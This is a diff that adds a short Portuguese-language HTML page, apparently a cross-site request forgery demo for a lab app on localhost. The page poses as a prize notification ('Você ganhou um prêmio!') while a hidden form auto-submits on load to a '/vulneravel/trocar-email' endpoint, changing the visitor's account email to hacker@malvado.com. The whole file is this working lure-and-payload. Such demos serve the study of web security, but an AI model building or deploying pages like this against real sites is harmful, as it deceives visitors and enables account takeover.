@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head><meta charset="UTF-8"><title>Você ganhou um prêmio!</title></head>
+<body>
+<h1>🎉 Parabéns, você ganhou um prêmio! 🎉</h1>
+<p>Carregando seu brinde...</p>
+
+<form id="ataque" action="http://localhost:3000/vulneravel/trocar-email" method="GET">
+  <input type="hidden" name="novoEmail" value="hacker@malvado.com">
+</form>
+
+<script>
+document.getElementById('ataque').submit();
+</script>
+</body>
+</html>
